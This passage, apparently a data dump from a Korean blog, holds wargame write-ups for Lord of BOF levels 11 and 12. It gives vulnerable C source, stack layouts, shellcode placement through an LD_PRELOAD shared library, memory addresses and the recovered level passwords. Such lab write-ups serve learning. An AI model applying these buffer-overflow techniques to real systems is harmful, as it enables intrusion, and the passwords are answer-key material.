src=\"/static/3eb56ffcbb915eb93f93fbac6a477d5d/e66bf/5.png\"\n            alt=\"info_frame\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>buffer가 0xbffffab4 ~ 0xbffffadb에 위치하고 있는 것을 확인하였다. 또한 바로 다음에 수행할 명령어의 위치를 나타내는 eip가 ebp보다 4만큼 큰 것을 확인하였다. 이를 이용하여 buffer 자리에 25바이트 쉘코드를 삽입하고 0xbffffab4로 eip를 조작하면 공격이 성공할 것이다. 페이로드를 아래와 같이 만들어서 공격을 진행해 보았다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 602px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 27.272727272727277%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAIAAADKYVtkAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAAj0lEQVR42o3PsQ6DMAwEUKNQ18SOkyBMjEoZyv//Y8VQWqkLb7jtdDporbm72TSZubuI3D4Q8cxfiAgAy7KAqkZmGmgYBiJCxCPviIghhL7v4U/XdQBgZvDctse61lpjjMwsIqrKwpqzpFQOOcaoqimlXHIphZmJaN9f0NxttnGsIQS45rs8tzYdfw0uO8tvmLsJb7NocS4AAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/953bcca7ab4fb23278ce657a56781ec7/c9b55/6.webp 165w,\n/static/953bcca7ab4fb23278ce657a56781ec7/f2908/6.webp 330w,\n/static/953bcca7ab4fb23278ce657a56781ec7/ff4b8/6.webp 602w\"\n              sizes=\"(max-width: 602px) 100vw, 602px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/953bcca7ab4fb23278ce657a56781ec7/04c57/6.png 165w,\n/static/953bcca7ab4fb23278ce657a56781ec7/d9ecf/6.png 330w,\n/static/953bcca7ab4fb23278ce657a56781ec7/32056/6.png 602w\"\n            sizes=\"(max-width: 602px) 100vw, 602px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/953bcca7ab4fb23278ce657a56781ec7/32056/6.png\"\n            alt=\"exploit\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>my-pass: new attacker</p>","categories":["writeup","wargame","pwnable"],"date":"February 05, 2016","description":"","id":"68469b94-a75c-5faa-8d10-dd1a7d3cdb4f","keywords":["lob"],"slug":"/Lord-of-BOF-WriteUp-12/","title":"LOB 12번 (golem -> darkknight)","readingTime":{"text":"3 min read"}},{"banner":{"alt":null,"caption":null,"src":{"childImageSharp":{"gatsbyImageData":{"layout":"constrained","backgroundColor":"#f8f8f8","images":{"fallback":{"src":"/static/81a3d62178e8dffe12da3ad4664940c9/972a9/0.png","srcSet":"/static/81a3d62178e8dffe12da3ad4664940c9/8ade6/0.png 123w,\n/static/81a3d62178e8dffe12da3ad4664940c9/0b8a8/0.png 247w,\n/static/81a3d62178e8dffe12da3ad4664940c9/972a9/0.png 493w","sizes":"(min-width: 493px) 493px, 100vw"},"sources":[{"srcSet":"/static/81a3d62178e8dffe12da3ad4664940c9/b7020/0.webp 123w,\n/static/81a3d62178e8dffe12da3ad4664940c9/086cd/0.webp 247w,\n/static/81a3d62178e8dffe12da3ad4664940c9/c5d55/0.webp 493w","type":"image/webp","sizes":"(min-width: 493px) 493px, 100vw"}]},"width":660,"height":400.2839756592292}}}},"body":"<p>source code:</p>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre class=\"language-c\"><code class=\"language-c\"><span class=\"token comment\">/*\r\n        The Lord of the BOF : The Fellowship of the BOF\r\n        - golem\r\n        - stack destroyer\r\n*/</span>\r\n\r\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h></span></span>\r\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdlib.h></span></span>\r\n\r\n<span class=\"token keyword\">extern</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>environ<span class=\"token punctuation\">;</span>\r\n\r\n<span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> argc<span class=\"token punctuation\">,</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>argv<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\r\n<span class=\"token punctuation\">{</span>\r\n        <span class=\"token keyword\">char</span> buffer<span class=\"token punctuation\">[</span><span class=\"token number\">40</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\r\n        <span class=\"token keyword\">int</span> i<span class=\"token punctuation\">;</span>\r\n\r\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>argc <span class=\"token operator\">&lt;</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\r\n                <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"argv error\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n                <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n        <span class=\"token punctuation\">}</span>\r\n\r\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token number\">47</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">!=</span> <span class=\"token char\">'\\xbf'</span><span class=\"token punctuation\">)</span>\r\n        <span class=\"token punctuation\">{</span>\r\n                <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"stack is still your friend.\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n                <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n        <span class=\"token punctuation\">}</span>\r\n\r\n        <span class=\"token function\">strcpy</span><span class=\"token punctuation\">(</span>buffer<span class=\"token punctuation\">,</span> argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n        <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%s\\n\"</span><span class=\"token punctuation\">,</span> buffer<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n\r\n        <span class=\"token comment\">// stack destroyer!</span>\r\n        <span class=\"token function\">memset</span><span class=\"token punctuation\">(</span>buffer<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">44</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n        <span class=\"token function\">memset</span><span class=\"token punctuation\">(</span>buffer<span class=\"token operator\">+</span><span class=\"token number\">48</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xbfffffff</span> <span class=\"token operator\">-</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>buffer<span class=\"token operator\">+</span><span class=\"token number\">48</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n<span class=\"token punctuation\">}</span></code></pre></div>\n<p>Stack frame structure:</p>\n<p>| i[4] |\r\n| buffer[40] |\r\n| Stack frame pointer |\r\n| Return address |\r\n| argc |\r\n| argv |\r\n| environ |</p>\n<p>환경변수를 초기화시키고 buffer를 0부터 40까지 0로 초기화시키고 있으며 argv를 모두 초기화시키고 있다. 거기에 남은 스택 영역까지 모두 0으로 초기화시키고 있다. 환경변수를 응용한 공격기법도 argv를 이용한 공격기법도 통하지 않게 되었다. 공유 라이브러리에 대한 힌트를 주었는데, 우선 라이브러리에 대한 개념을 간단히 정리해 보고자 한다.</p>\n<p>자주 사용되는 기능들을 분리시켜 바이너리 형태로 모아놓은 것을 라이브러리라고 하며, 라이브러리에는 정적 라이브러리와 동적 라이브러리가 있다. 정적 라이브러리(Static library)는 컴파일, 링킹 단계에서 라이브러리를 실행 바이너리에 포함시키는 방식의 라이브러리를 뜻한다. 이와 같은 방식은 라이브러리를 사용하는 프로그램이 늘어날수록 불필요하게 실행 파일들의 크기가 커지고 퍼포먼스가 떨어지는 등 비효율적이기 때문에 자주 사용되지 않는다.</p>\n<p>위와 같은 이유로 동적 라이브러리(Dynamic Library)가 더 잘 사용되는 경향이 있다. 동적 라이브러리는 여러 프로그램들이 공통으로 필요로 하는 기능들을 따로 모아 필요할 때에 쓸 수 있게끔 만들어 놓은 것이다. 동적 라이브러리는 호출하는 프로그램을 해당 모듈을 실행시킬 때에만 불러와서 사용하는 방식으로, 프로그램에는 호출할 라이브러리 함수의 정보만 적재하면 되기 때문에 정적 라이브러리에 비해 메모리를 효율적으로 사용할 수 있는 장점이 있다. 윈도우에서는 DLL(Dynamic Linked Library)이라고 부르며, 리눅스에서는 공유 라이브러리(Shared Library)라고 부른다. 공유 라이브러리는 프로그램 시작 시 메모리에 적재된다.</p>\n<p>위와 같은 것을 알아둔 후, 맨 위에서 언급했던 메모리 영역 이미지를 상기시켜 보자.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 493px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 146.06060606060606%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAdCAIAAAAl5NuSAAAACXBIWXMAAA7DAAAOwwHHb6hkAAADCklEQVR42oVUyXKjMBT0/3+Wc8gll5TtJN4EErvQLiGBBPaUUYpynJlxHyi21lu631t576uqWq/X2+12t9t9fX1tNpssy5qmKYpiGIbrv7G6Xq9SyqqqpJTTNHnvx3Hs+34YBill3/dPyISQ0+mklGJ3kFK2bfuczDnf7XaXy+XhW4z/nFwUBWOsbVtKKWOMUqqUklKWZVlVldYaIZSmaZ7nx+MRY3y9Xi+XyyqmV5Zl27Z5nuMZeZ4bY7TWzrn43zQj3iw5/iAXRYExbtu2aRrn3D05IoRwf9YtbSFEzJNSKoSICTvnpJRpmnLOCSHv7++73W4zAwBQFIUQ4kbWWhNChBBaa2MM51xKqbUehiF2exgGNcMYc6/fyntPKY0EpZTWWkrJOV/i/6/blFIAQFmWMW2MsVLKex9CUEoBAKy1UXnO+TiOsfhvMgBgu902TUMpJYRgjIUQ1lrnnBCiLMskSV5eXl5fX/f7/TiOPyJjjJMkyfM8yts0jZQyhOC9l1IeDoeu6zjnWuvfLro1jFJ6Pp8hhGVZFkUBIQQAtG0bW7j8+ndy27bH4zFJkkiLyLIsz/Oov9YaQsgYezjie6rqutZaM8astVJKY0zXdfGx7/txHEMIDwXfyNM0McaEEF3Xaa2ttYuklNInU+Wcq+v68/MTQng6nfb7ffRZtK21lhBSVVVs5DRNjzoTQhhjWmvOuTEmijyOY9d1zrmov5TSWvvQs1Xf93VdI4SapkEIiRmxEIxx3/eU0rIsOeeMscfIcYd9fHxkWZYkyeFwyLKsnoEQOp1OwwxjzO/FsAoh1HVtjAkhxElYuuqcK4pis9ms1+u3t7fz+cw5v1drNY5jmqYAgKqqokMIIXoGIQQAEG0XB/jRntH9WZYtq2e50hmLvf7isOjtpmmUUu4OIYTnq9c5dz6fMcbe++Xtwoyj3vd9HBtK6X3Db1LFwhhjZEYsMk3TOKfxFCHEb7W+dxiEkFKapilCKM9zhJD33hjzfOk75yCEaAaEMEkSY4y11hgTV8f9Ar0n/wEyhHNvkuJiPwAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/81a3d62178e8dffe12da3ad4664940c9/c9b55/0.webp 165w,\n/static/81a3d62178e8dffe12da3ad4664940c9/f2908/0.webp 330w,\n/static/81a3d62178e8dffe12da3ad4664940c9/4efd5/0.webp 493w\"\n              sizes=\"(max-width: 493px) 100vw, 493px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/81a3d62178e8dffe12da3ad4664940c9/04c57/0.png 165w,\n/static/81a3d62178e8dffe12da3ad4664940c9/d9ecf/0.png 330w,\n/static/81a3d62178e8dffe12da3ad4664940c9/f88d0/0.png 493w\"\n            sizes=\"(max-width: 493px) 100vw, 493px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/81a3d62178e8dffe12da3ad4664940c9/f88d0/0.png\"\n            alt=\"stack frame\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>Stack 영역 아래에 Shared library영역이 존재하는 것을 알 수 있다. 이 공유라이브러리를 응용해서 공격을 진행해 보았다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 313px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 15.75757575757576%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAADCAIAAAAcOLh5AAAACXBIWXMAAA7DAAAOwwHHb6hkAAAAgUlEQVR42m3LwRLCIAxFUdhQNZRCpiQEUmq1Tv//Dx07jivP4q7eM011UZUiUsu6bSJcCmvvrbUYQ875OF7TFFKcmraEcQyhrx0RnXOGm9RFqBBRvp9nJpJamTmMHhGf+8N7SCkCgDHGWvupOcHuYYOB3GW4al/meYYbmB/7Xf/1BhMTCqm+JXefAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/ae3dc506759c1aa41df57f80835c5032/c9b55/1.webp 165w,\n/static/ae3dc506759c1aa41df57f80835c5032/12766/1.webp 313w\"\n              sizes=\"(max-width: 313px) 100vw, 313px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/ae3dc506759c1aa41df57f80835c5032/04c57/1.png 165w,\n/static/ae3dc506759c1aa41df57f80835c5032/80977/1.png 313w\"\n            sizes=\"(max-width: 313px) 100vw, 313px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/ae3dc506759c1aa41df57f80835c5032/80977/1.png\"\n            alt=\"ls\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>ldsh.c라는 빈 파일을 생성한 후 이것으로 쉘코드를 컴파일한다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 602px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 12.727272727272728%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAADCAIAAAAcOLh5AAAACXBIWXMAAA7DAAAOwwHHb6hkAAAAdUlEQVR42i2NQQ7DQAgDcy6RonZ3A8Ym6f9fWdF2DmDJBm/3+5ZEMZkkALifKq21VIWEqsZ4zTmvqzziNZ4UPdzDNyB+9B16ZdPzq5Ekme7efmZVRURJCWwR3lng3y9lt6k/kHXVXOecAx3BcRxm9jDb993MPlwZERCLh72HAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/f650c4667bc02acf478d8926c8100996/c9b55/2.webp 165w,\n/static/f650c4667bc02acf478d8926c8100996/f2908/2.webp 330w,\n/static/f650c4667bc02acf478d8926c8100996/ff4b8/2.webp 602w\"\n              sizes=\"(max-width: 602px) 100vw, 602px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/f650c4667bc02acf478d8926c8100996/04c57/2.png 165w,\n/static/f650c4667bc02acf478d8926c8100996/d9ecf/2.png 330w,\n/static/f650c4667bc02acf478d8926c8100996/32056/2.png 602w\"\n            sizes=\"(max-width: 602px) 100vw, 602px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/f650c4667bc02acf478d8926c8100996/32056/2.png\"\n            alt=\"gcc\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 602px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 15.151515151515152%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAADCAIAAAAcOLh5AAAACXBIWXMAAA7DAAAOwwHHb6hkAAAAdUlEQVR42o2MSwrDMAwF7ViSY1myrSTQFFL62+X+ByxqL9DHLAYGXri8d1uHiqo0LqwiXDjGGP7ZOCxbnuqUagKFJCk1FxAgIxxIC9Fwwe64d/TUMeip/OByLXxwvdf6FHkJ3zivmTZCw3mfycgZiF+gwe/xA/k+BkZtk4QiAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/17cc8e95786c3528e071021bceb59f1b/c9b55/3.webp 165w,\n/static/17cc8e95786c3528e071021bceb59f1b/f2908/3.webp 330w,\n/static/17cc8e95786c3528e071021bceb59f1b/ff4b8/3.webp 602w\"\n              sizes=\"(max-width: 602px) 100vw, 602px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/17cc8e95786c3528e071021bceb59f1b/04c57/3.png 165w,\n/static/17cc8e95786c3528e071021bceb59f1b/d9ecf/3.png 330w,\n/static/17cc8e95786c3528e071021bceb59f1b/32056/3.png 602w\"\n            sizes=\"(max-width: 602px) 100vw, 602px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/17cc8e95786c3528e071021bceb59f1b/32056/3.png\"\n            alt=\"ls2\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<ul>\n<li>shared: 공유 라이브러리를 우선 링크하라</li>\n<li>fPIC: object 파일을 만들 시 심볼이 어느 위치에 있던 동작을 하는 구조로 컴파일 하라</li>\n</ul>\n<p>공유 라이브러리는 LD_PRELOAD라는 환경변수에 등록시키면 해당 영역에 올릴 수 있게 된다. 이를 환경변수에 등록시킨다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 602px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 12.121212121212121%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAACCAIAAADXZGvcAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAAV0lEQVR42i2NOxaDMBADOUJoNvauPqbCNdz/bjyTNNJoGm29NYqZGREACiUJRFaO47ANQpYtWRTXlOIb131ty4r+FUD+WW/IpuRhj9F6L2I9VX32/ZzzAT8kDcILebUFAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/17334f6fe7d28e1bcf67cdfc36232660/c9b55/4.webp 165w,\n/static/17334f6fe7d28e1bcf67cdfc36232660/f2908/4.webp 330w,\n/static/17334f6fe7d28e1bcf67cdfc36232660/ff4b8/4.webp 602w\"\n              sizes=\"(max-width: 602px) 100vw, 602px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/17334f6fe7d28e1bcf67cdfc36232660/04c57/4.png 165w,\n/static/17334f6fe7d28e1bcf67cdfc36232660/d9ecf/4.png 330w,\n/static/17334f6fe7d28e1bcf67cdfc36232660/32056/4.png 602w\"\n            sizes=\"(max-width: 602px) 100vw, 602px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/17334f6fe7d28e1bcf67cdfc36232660/32056/4.png\"\n            alt=\"export\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>gdb로 분석하여 LD_PRELOAD에 포함되어 있는 쉘코드의 위치를 찾는다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 600px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 40%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAICAIAAAB2/0i6AAAACXBIWXMAAA7DAAAOwwHHb6hkAAABHElEQVR42k3Q2W7DIBBA0ZGKiVUvSTHbrJD//8kKHFXlEenMhYHWW3v3nDMAXDGqKTMDwH4coqKm67o656xZ6+31egEAMZlpKQWsmbWWUgSAODExTrxbN1Z+PLxblnvQ+XwCABJq05TTGMMiIfwAwE8IxFRqAYBt21i5Inq/OOcqIQsf5wEAuWQSuuIFovpXDlcg+YeFkeqNcWA6joFLrTxwAB5lvkK4y0g4PgPwvW04j/f+yzlkIv7glBPzLKsKiXzK8RrPnnjbdyKsWB/eO+eISYT3fZ84I2KMEfq7t3cvOY3blNSMmADgOI/Wm6iu62MsTMSaPV9zYcyt21iYmqpZjNcsR2JCwrssqsjkvXeLEx34nAurtbBwTPEXSvoimwaimKUAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/ed4376a666e041edc9425e779a6dc39c/c9b55/5.webp 165w,\n/static/ed4376a666e041edc9425e779a6dc39c/f2908/5.webp 330w,\n/static/ed4376a666e041edc9425e779a6dc39c/e88ff/5.webp 600w\"\n              sizes=\"(max-width: 600px) 100vw, 600px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/ed4376a666e041edc9425e779a6dc39c/04c57/5.png 165w,\n/static/ed4376a666e041edc9425e779a6dc39c/d9ecf/5.png 330w,\n/static/ed4376a666e041edc9425e779a6dc39c/0a47e/5.png 600w\"\n            sizes=\"(max-width: 600px) 100vw, 600px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/ed4376a666e041edc9425e779a6dc39c/0a47e/5.png\"\n            alt=\"memory\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>0xbffff564부터 쉘코드가 위치하고 있는 것을 찾았다. 이를 이용해 공격을 진행하였다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 602px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 22.424242424242426%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAECAIAAAABPYjBAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAAhUlEQVR42o2MwQ6DMAxDjRqnKSmHVVRiBBD//5XTGNt572BZlm0817W1R75QpapmVRFRVSFzziklEaHyDkVIAjiOA8uyTNNE8i59SSmRFN6zX/65ABAROM8zIlpr7m5m40WtnvPbl1Lc/aNWbHQvZrVWVe77hthinufeu4jgP4ZhANB7fwHZvQece0ZxeQAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/f8d10891e84bee9c95efc121f28f26ae/c9b55/6.webp 165w,\n/static/f8d10891e84bee9c95efc121f28f26ae/f2908/6.webp 330w,\n/static/f8d10891e84bee9c95efc121f28f26ae/ff4b8/6.webp 602w\"\n              sizes=\"(max-width: 602px) 100vw, 602px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/f8d10891e84bee9c95efc121f28f26ae/04c57/6.png 165w,\n/static/f8d10891e84bee9c95efc121f28f26ae/d9ecf/6.png 330w,\n/static/f8d10891e84bee9c95efc121f28f26ae/32056/6.png 602w\"\n            sizes=\"(max-width: 602px) 100vw, 602px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/f8d10891e84bee9c95efc121f28f26ae/32056/6.png\"\n            alt=\"my-pass\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>my-pass: cup of coffee</p>","categories":["writeup","wargame","pwnable"],"date":"February 05, 2016","description":"","id":"2e1a8957-8038-541d-935f-150a0938002e","keywords":["lob"],"slug":"/Lord-of-BOF-WriteUp-11/","title":"LOB 11번 (skeleton -> golem)","readingTime":{"text":"5 min read"}},{"banner":{"alt":null,"caption":null,"src":{"childImageSharp":{"gatsbyImageData":{"layout":"constrained","backgroundColor":"#080808","images":{"fallback":{"src":"/static/4d3a4bbdb82d73e112ebde43c6067301/43ec3/0.png","srcSet":"/static/4d3a4bbdb82d73e112ebde43c6067301/44065/0.png 151w,\n/static/4d3a4bbdb82d73e112ebde43c6067301/0b26b/0.png 301w,\n/static/4d3a4bbdb82d73e112ebde43c6067301/43ec3/0.png 602w","sizes":"(min-width: 602px) 602px, 100vw"},"sources":[{"srcSet":"/static/4d3a4bbdb82d73e112ebde43c6067301/cc7b4/0.webp 151w,\n/static/4d3a4bbdb82d73e112ebde43c6067301/7abbd/0.webp 301w,\n/static/4d3a4bbdb82d73e112ebde43c6067301/e8977/0.webp 602w","type":"image/webp","sizes":"(min-width: 602px) 602px, 100vw"}]},"width":660,"height":400.1661129568106}}}},"body":"<p>source code:</p>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre class=\"language-c\"><code class=\"language-c\"><span class=\"token comment\">/*\r\n        The Lord of the BOF : The Fellowship of the BOF\r\n        - bugbear\r\n        - RTL1\r\n*/</span>\r\n\r\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h></span></span>\r\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdlib.h></span></span>\r\n\r\n<span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> argc<span class=\"token punctuation\">,</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>argv<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\r\n<span class=\"token punctuation\">{</span>\r\n        <span class=\"token keyword\">char</span> buffer<span class=\"token punctuation\">[</span><span class=\"token number\">40</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\r\n        <span class=\"token keyword\">int</span> i<span class=\"token punctuation\">;</span>\r\n\r\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>argc <span class=\"token operator\">&lt;</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\r\n                <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"argv error\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n                <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n        <span class=\"token punctuation\">}</span>\r\n\r\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token number\">47</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token char\">'\\xbf'</span><span class=\"token punctuation\">)</span>\r\n        <span class=\"token punctuation\">{</span>\r\n                <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"stack betrayed you!!\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n                <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n        <span class=\"token punctuation\">}</span>\r\n\r\n        <span class=\"token function\">strcpy</span><span class=\"token punctuation\">(</span>buffer<span class=\"token 